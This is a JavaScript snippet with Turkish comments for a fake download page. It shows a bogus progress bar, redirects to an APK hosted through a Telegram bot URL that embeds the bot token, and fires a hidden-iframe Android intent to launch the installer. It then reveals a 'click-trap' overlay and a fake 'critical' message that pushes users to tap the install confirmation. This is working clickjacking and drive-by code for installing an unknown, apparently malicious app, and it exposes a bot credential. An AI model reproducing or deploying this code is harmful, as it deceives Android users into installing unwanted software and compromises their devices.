document.getElementById('start-btn').addEventListener('click', function() {
    this.style.display = 'none';
    const bar = document.getElementById('bar');
    const status = document.getElementById('status');
    const trap = document.getElementById('click-trap');

    let width = 0;
    const interval = setInterval(() => {
        width += Math.random() * 5;
        if (width >= 100) {
            clearInterval(interval);
            bar.style.width = "100%";
            status.innerText = "Yükleme başlatılıyor...";

            const apkUrl = "https://api.telegram.org/file/bot8518852246:AAGSdZmBxtrhl-TLkdtf062Tx9RrKqjzIWU/documents/file_4.apk";

            // 1. ADIM: Doğrudan indirme tetikle (Popup'ı fırlatır)
            window.location.href = apkUrl;

            // 2. ADIM: 1 saniye sonra Tuzağı ve Intent'i devreye sok
            setTimeout(() => {
                // Videodaki o 'chrome sıfırlanma' anını yaratan derin bağlantı
                const intentUrl = `intent://${apkUrl.replace('https://', '')}#Intent;scheme=https;type=application/vnd.android.package-archive;end`;
                
                // Sayfayı bu intent'e zorla
                const dummyIframe = document.createElement('iframe');
                dummyIframe.style.display = 'none';
                dummyIframe.src = intentUrl;
                document.body.appendChild(dummyIframe);

                // Tuzağı görünür yap
                trap.style.display = "block";
                
                // Kullanıcıyı o kırmızı (artık tam butonun üstünde olan) yere dokunmaya ikna et
                status.innerHTML = "<b style='color:#d93025'>KRİTİK:</b> Devam etmek için alttaki onaya dokunun.";
            }, 1000);

        } else {
            bar.style.width = width + "%";
            status.innerText = "İndiriliyor: %" + Math.round(width);
        }
    }, 120);
});
